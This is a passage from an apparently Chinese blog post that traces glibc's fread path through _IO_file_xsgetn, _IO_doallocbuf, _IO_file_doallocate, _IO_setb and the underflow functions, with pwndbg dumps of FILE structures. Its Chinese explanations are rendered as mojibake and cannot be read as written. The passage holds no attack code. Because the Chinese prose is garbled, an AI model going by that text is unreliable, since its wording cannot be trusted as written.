&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (want &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">      <span class="comment">//step2ï¼šå¦‚æœè¾“å…¥ç¼“å†²åŒºä¸­å·²æœ‰è¶³å¤Ÿçš„å­—ç¬¦ï¼Œç›´æ¥å°†ç¼“å†²åŒºä¸­çš„å­—ç¬¦ç»™ç›®æ ‡buf</span></span><br><span class="line">      <span class="keyword">if</span> (want &lt;= have)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, want);</span><br><span class="line">  fp-&gt;_IO_read_ptr += want;</span><br><span class="line">  want = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">      <span class="comment">//å¦‚æœç¼“å†²åŒºä¸­æœ‰éƒ¨åˆ†å­—ç¬¦ï¼Œä½†æ²¡æœ‰è¾¾åˆ°freadçš„sizeï¼Œå…ˆå°†å·²æœ‰çš„æ‹·è´åˆ°ç›®æ ‡buf</span></span><br><span class="line">  <span class="keyword">if</span> (have &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _LIBC</span></span><br><span class="line">      s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">      <span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line">      s += have;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      want -= have;</span><br><span class="line">      fp-&gt;_IO_read_ptr += have;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Check for backup and repeat */</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_switch_to_main_get_area (fp);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If we now want less than a buffer, underflow and repeat</span></span><br><span class="line"><span class="comment">     the copy.  Otherwise, _IO_SYSREAD directly to</span></span><br><span class="line"><span class="comment">     the user buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base</span><br><span class="line">      &amp;&amp; want &lt; (<span class="keyword">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (__underflow (fp) == EOF)</span><br><span class="line">             <span class="comment">//step3ï¼šå¦‚æœè¾“å…¥ç¼“å†²åŒºä¸èƒ½æ»¡è¶³è¦æ±‚ï¼Œè°ƒç”¨__underflowè¯»æ•°æ®</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  .....</span><br><span class="line">  <span class="keyword">return</span> n - want;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_file_xsgetn)</span><br></pre></td></tr></table></figure><p>å‡½æ•°<code>_IO_file_xsgetn</code>æ˜¯freadçš„æ ¸å¿ƒï¼Œåˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªéƒ¨åˆ†ï¼š</p><ol><li> å¦‚æœ<code>fp-&gt;_IO_buf_base == NULL</code>ï¼Œè¡¨åè¾“å…¥ç¼“å†²åŒºè¿˜æœªå»ºç«‹ï¼Œè°ƒç”¨<code>_IO_doallocbuf</code>åˆå§‹åŒ–æŒ‡é’ˆï¼Œå»ºç«‹è¾“å…¥ç¼“å†²åŒº</li><li> è¾“å…¥ç¼“å†²åŒºä¸­æœ‰æ•°æ®ï¼Œå³<code>fp-&gt;_IO_read_ptr</code>å°äº<code>fp-&gt;_IO_read_end</code>ï¼Œç›´æ¥å°†è¾“å…¥ç¼“å†²åŒºä¸­çš„å†…ç­’æ‹·è´åˆ°ç›®æ ‡buf</li><li> è¾“å…¥ç¼“å†²åŒºä¸ºç©ºæˆ–è€…ä¸èƒ½æ»¡è¶³å…¨éƒ¨çš„éœ€æ±‚ï¼Œè°ƒç”¨<code>__underflow</code>è°ƒç”¨ç³»ç»Ÿè°ƒç”¨è¯»å…¥æ•°æ®</li></ol><p>æ¥ä¸‹æ¥å°±æ˜¯å…·ä½“ä»‹ç»è¿™å‡ ä¸ªéƒ¨åˆ†ã€‚</p><h3 id="step1ï¼šåˆå§‹åŒ–è¾“å…¥ç¼“å†²åŒº"><a href="#step1ï¼šåˆå§‹åŒ–è¾“å…¥ç¼“å†²åŒº" class="headerlink" title="step1ï¼šåˆå§‹åŒ–è¾“å…¥ç¼“å†²åŒº"></a>step1ï¼šåˆå§‹åŒ–è¾“å…¥ç¼“å†²åŒº</h3><p>å¦‚æœ<code>fp-&gt;_IO_buf_base == NULL</code>åˆ™è°ƒç”¨<code>_IO_doallocbuf</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_doallocbuf (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED) || fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> (_IO_DOALLOCATE (fp) != EOF)</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  _IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_doallocbuf)</span><br></pre></td></tr></table></figure><p>å…ˆæ£€æŸ¥<code>fp-&gt;_IO_buf_base</code>æ˜¯å¦ä¸ºç©ºï¼Œä¸ä¸ºç©ºä»£è¡¨ç¼“å†²åŒºå·²è¢«åˆå§‹åŒ–ï¼Œç›´æ¥è¿”å›ï¼Œç„¶åæ£€æŸ¥<code>fp-&gt;_flags</code>æ˜¯ä¸æ˜¯<code>_IO_UNBUFFERED</code>æˆ–è€…<code>fp-&gt;_mode</code>å¤§äº0ã€‚</p><p>å¦‚æœæ»¡è¶³åˆ™æ‰§è¡Œ<code>_IO_DOALLOCATE</code>ï¼ŒåŠè°ƒç”¨vtableä¸­çš„<code>_IO_file_doallocate</code>ï¼Œè·Ÿè¿›å»çœ‹çœ‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_file_doallocate (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t size;</span><br><span class="line">  <span class="keyword">char</span> *p;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat64</span> <span class="title">st</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _LIBC</span></span><br><span class="line">  <span class="comment">/* If _IO_cleanup_registration_needed is non-zero, we should call the</span></span><br><span class="line"><span class="comment">     function it points to.  This is to make sure _IO_cleanup gets called</span></span><br><span class="line"><span class="comment">     on exit.  We call it from _IO_file_doallocate, since that is likely</span></span><br><span class="line"><span class="comment">     to get called by any program that does buffered I/O. */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (_IO_cleanup_registration_needed != <span class="literal">NULL</span>))</span><br><span class="line">    (*_IO_cleanup_registration_needed) ();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  size = _IO_BUFSIZ;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_fileno &gt;= <span class="number">0</span> &amp;&amp; __builtin_expect (_IO_SYSSTAT (fp, &amp;st), <span class="number">0</span>) &gt;= <span class="number">0</span>)</span><br><span class="line">      <span class="comment">//è°ƒç”¨_IO_SYSSTATè·å–FILEä¿¡æ¯</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (S_ISCHR (st.st_mode))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Possibly a tty.  */</span></span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEV_TTY_P</span></span><br><span class="line">      DEV_TTY_P (&amp;st) ||</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      local_isatty (fp-&gt;_fileno))</span><br><span class="line">    fp-&gt;_flags |= _IO_LINE_BUF;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> _IO_HAVE_ST_BLKSIZE</span></span><br><span class="line">      <span class="keyword">if</span> (st.st_blksize &gt; <span class="number">0</span>)</span><br><span class="line">size = st.st_blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  p = <span class="built_in">malloc</span> (size);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (p == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  _IO_setb (fp, p, p + size, <span class="number">1</span>);</span><br><span class="line">  <span class="comment">//è°ƒç”¨_IO_setbè®¾ç½®ç¼“å†²åŒº</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_file_doallocate)</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°<code>_IO_file_doallocate</code>å…ˆè°ƒç”¨<code>_IO_SYSSTAT</code>è·å–æ–‡ä»¶ä¿¡æ¯ï¼ˆ<code>_IO_SYSSTAT</code>æ˜¯vtableä¸­çš„<code>_start</code>å‡½æ•°ï¼Œè·å–æ–‡ä»¶ä¿¡æ¯ï¼Œä¿®æ”¹ç›¸åº”éœ€è¦ç”³è¯·çš„sizeï¼‰ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> <span class="built_in">print</span> st</span></span><br><span class="line"><span class="meta">$</span><span class="bash">7 = &#123;</span></span><br><span class="line">  st_dev = 2049, </span><br><span class="line">  st_ino = 545917, </span><br><span class="line">  st_nlink = 1, </span><br><span class="line">  st_mode = 33188, </span><br><span class="line">  st_uid = 1000, </span><br><span class="line">  st_gid = 1000, </span><br><span class="line">  __pad0 = 0, </span><br><span class="line">  st_rdev = 0, </span><br><span class="line">  st_size = 0, </span><br><span class="line">  st_blksize = 4096, </span><br><span class="line">  st_blocks = 0, </span><br><span class="line">  st_atim = &#123;</span><br><span class="line">    tv_sec = 1632561914, </span><br><span class="line">    tv_nsec = 519216733</span><br><span class="line">  &#125;, </span><br><span class="line">  st_mtim = &#123;</span><br><span class="line">    tv_sec = 1632490672, </span><br><span class="line">    tv_nsec = 158707989</span><br><span class="line">  &#125;, </span><br><span class="line">  st_ctim = &#123;</span><br><span class="line">    tv_sec = 1632490672, </span><br><span class="line">    tv_nsec = 158707989</span><br><span class="line">  &#125;, </span><br><span class="line">  __glibc_reserved = &#123;0, 0, 0&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°<code>st_blksize</code>ä¸º0x1000ï¼Œmallocä¹‹åè°ƒç”¨äº†<code>_IO_setb</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_setb (_IO_FILE *f, <span class="keyword">char</span> *b, <span class="keyword">char</span> *eb, <span class="keyword">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    <span class="built_in">free</span> (f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_buf_base = b;<span class="comment">//è®¾ç½®äº†_IO_buf_base </span></span><br><span class="line">  f-&gt;_IO_buf_end = eb;<span class="comment">//è®¾ç½®_IO_buf_end</span></span><br><span class="line">  <span class="keyword">if</span> (a)</span><br><span class="line">    f-&gt;_flags &amp;= ~_IO_USER_BUF;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    f-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_setb)</span><br></pre></td></tr></table></figure><p>è®¾ç½®äº†<code>_IO_buf_base</code>å’Œ<code>_IO_buf_end</code>ï¼Œ<code>_IO_setb</code>æ‰§è¡Œå®Œå<code>_IO_buf_base</code>å’Œ<code>_IO_buf_end</code>å·²è¢«èµ‹å€¼ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; print *_IO_list_all</span><br><span class="line">$<span class="number">2</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">-72539000</span>, </span><br><span class="line">    _IO_read_ptr = <span class="number">0x0</span>, </span><br><span class="line">    _IO_read_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_read_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_write_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_write_ptr = <span class="number">0x0</span>, </span><br><span class="line">    _IO_write_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_buf_base = <span class="number">0x602240</span> <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _IO_buf_end = <span class="number">0x603240</span> <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>, </span><br><span class="line">    _markers = <span class="number">0x0</span>, </span><br><span class="line">    _chain = <span class="number">0x7ffff7dd2540</span> &lt;_IO_2_1_stderr_&gt;, </span><br><span class="line">    _fileno = <span class="number">3</span>, </span><br><span class="line">    _flags2 = <span class="number">0</span>, </span><br><span class="line">    _old_offset = <span class="number">0</span>, </span><br><span class="line">    _cur_column = <span class="number">0</span>, </span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>, </span><br><span class="line">    _shortbuf = <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _lock = <span class="number">0x6020f0</span>, </span><br><span class="line">    _offset = <span class="number">-1</span>, </span><br><span class="line">    _codecvt = <span class="number">0x0</span>, </span><br><span class="line">    _wide_data = <span class="number">0x602100</span>, </span><br><span class="line">    _freeres_list = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>, </span><br><span class="line">    __pad5 = <span class="number">0</span>, </span><br><span class="line">    _mode = <span class="number">0</span>, </span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = <span class="number">0x7ffff7dd06e0</span> &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆå§‹åŒ–ä¹‹åè¿”å›åˆ°<code>_IO_file_doallocate</code>ï¼Œç„¶å<code>_IO_file_doallocate</code>ä¹Ÿæ‰§è¡Œå®Œæˆ ï¼Œè¿”å›åˆ°<code>_IO_file_xsgetn</code>ä¸­ã€‚</p><h3 id="step2ï¼šæ‹·è´è¾“å…¥ç¼“å†²åŒºæ•°æ®"><a href="#step2ï¼šæ‹·è´è¾“å…¥ç¼“å†²åŒºæ•°æ®" class="headerlink" title="step2ï¼šæ‹·è´è¾“å…¥ç¼“å†²åŒºæ•°æ®"></a>step2ï¼šæ‹·è´è¾“å…¥ç¼“å†²åŒºæ•°æ®</h3><p>åˆå§‹åŒ–å®Œæˆåå°±åˆ°äº†ç¬¬äºŒæ­¥ï¼Œæ‹·è´è¾“å…¥ç¼“å†²åŒºæ•°æ®ã€‚å¦‚æœè¾“å…¥ç¼“å†²åŒºä¸­å·²æœ‰è¶³å¤Ÿçš„å­—ç¬¦ï¼Œç›´æ¥å°†ç¼“å†²åŒºä¸­çš„å­—ç¬¦ç»™ç›®æ ‡bufã€‚<code>fp-&gt;_IO_read_ptr</code>æŒ‡å‘çš„æ˜¯è¾“å…¥ç¼“å†²åŒºçš„å…¶å®åœ°å€ï¼Œ<code>fp-&gt;_IO_read_end</code>æŒ‡å‘è¾“å…¥ç¼“å†²åŒºçš„ç»“æŸã€‚</p><h3 id="step3ï¼šæ‰§è¡Œç³»ç»Ÿè°ƒç”¨è¯»å–æ•°æ®"><a href="#step3ï¼šæ‰§è¡Œç³»ç»Ÿè°ƒç”¨è¯»å–æ•°æ®" class="headerlink" title="step3ï¼šæ‰§è¡Œç³»ç»Ÿè°ƒç”¨è¯»å–æ•°æ®"></a>step3ï¼šæ‰§è¡Œç³»ç»Ÿè°ƒç”¨è¯»å–æ•°æ®</h3><p>å½“è¾“å…¥ç¼“å†²åŒºä¸º0æˆ–è€…ä¸èƒ½æ»¡è¶³éœ€æ±‚çš„æ—¶å€™ä¼šæ‰§è¡Œ<code>__underflow</code>è°ƒç”¨ç³»ç»Ÿè°ƒç”¨readè¯»å–æ•°æ®å¹¶æ”¾åˆ°è¾“å…¥ç¼“å†²åŒºä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">__underflow (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//ä¸€äº›æ£€æŸ¥</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) == <span class="number">0</span> &amp;&amp; _IO_fwide (fp, <span class="number">-1</span>) != <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode == <span class="number">0</span>)</span><br><span class="line">    _IO_fwide (fp, <span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_put_mode (fp))</span><br><span class="line">    <span class="keyword">if</span> (_IO_switch_to_get_mode (fp) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_switch_to_main_get_area (fp);</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line"><span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (_IO_have_markers (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (save_for_backup (fp, fp-&gt;_IO_read_end))</span><br><span class="line"><span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">    _IO_free_backup_area (fp);</span><br><span class="line">  <span class="keyword">return</span> _IO_UNDERFLOW (fp);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__underflow)</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ä¸€ä¸ªæ£€æŸ¥æ˜¯å¦‚æœ<code>fp-&gt;_IO_read_ptr</code>å°äº<code>fp-&gt;_IO_read_end</code>åˆ™è¡¨æ˜è¾“å…¥ç¼“å†²åŒºé‡Œå­˜åœ¨æ•°æ®ï¼Œå¯ç›´æ¥è¿”å›ï¼Œå¦åˆ™åˆ™è¡¨ç¤ºéœ€è¦ç»§ç»­è¯»å…¥æ•°æ®ã€‚éƒ½é€šè¿‡çš„è¯ä¼šæ‰§è¡Œ<code>_IO_UNDERFLOW</code>ï¼Œå®ƒæ˜¯vtableä¸­çš„<code>_IO_new_file_underflow</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_file_underflow (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_ssize_t count;</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">// å¦‚æœå­˜åœ¨_IO_NO_READSæ ‡å¿—ï¼Œåˆ™ç›´æ¥è¿”å›</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// å¦‚æœè¾“å…¥ç¼“å†²åŒºé‡Œå­˜åœ¨æ•°æ®ï¼Œåˆ™ç›´æ¥è¿”å›</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">// å¦‚æœæ²¡æœ‰è¾“å…¥ç¼“å†²åŒºï¼Œåˆ™è°ƒç”¨_IO_doallocbufåˆ†é…è¾“å…¥ç¼“å†²åŒº</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ...</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">// è®¾ç½®FILEç»“æ„ä½“æŒ‡é’ˆ</span></span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line">  <span class="comment">//è°ƒç”¨_IO_SYSREADå‡½æ•°æœ€ç»ˆæ‰§è¡Œç³»ç»Ÿè°ƒç”¨è¯»å–æ•°æ®</span></span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">           fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">// è®¾ç½®ç»“æ„ä½“æŒ‡é’ˆ</span></span><br><span class="line">  fp-&gt;_IO_read_end += count;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)</span><br></pre></td></tr></table></figure><p><code>_IO_new_file_underflow</code>æ˜¯æœ€ç»ˆæ‰§è¡Œç³»ç»Ÿè°ƒç”¨çš„åœ°æ–¹ï¼Œè°ƒç”¨å‰ä»æœ‰ä¸€äº›æ£€æŸ¥ï¼š</p><ol><li> æ£€æŸ¥FILEç»“æ„ä½“çš„<code>_flag</code>æ ‡å¿—ä½æ˜¯å¦åŒ…å«<code>_IO_NO_READS</code>ï¼Œå¦‚æœå­˜åœ¨è¿™ä¸ªæ ‡å¿—ä½åˆ™ç›´æ¥è¿”å›<code>EOF</code>ï¼Œå…¶ä¸­<code>_IO_NO_READS</code>æ ‡å¿—ä½çš„å®šä¹‰æ˜¯<code>#define _IO_NO_READS 4 /* Reading not allowed */</code>ã€‚</li><li> å¦‚æœ<code>fp-&gt;_IO_buf_base</code>ä½nullï¼Œåˆ™è°ƒç”¨<code>_IO_doallocbuf</code>åˆ†é…è¾“å…¥ç¼“å†²åŒºã€‚</li><li> æ¥ç€åˆå§‹åŒ–è®¾ç½®FILEç»“æ„ä½“æŒ‡é’ˆï¼Œå°†ä»–ä»¬éƒ½è®¾ç½®æˆ<code>fp-&gt;_IO_buf_base</code></li><li> 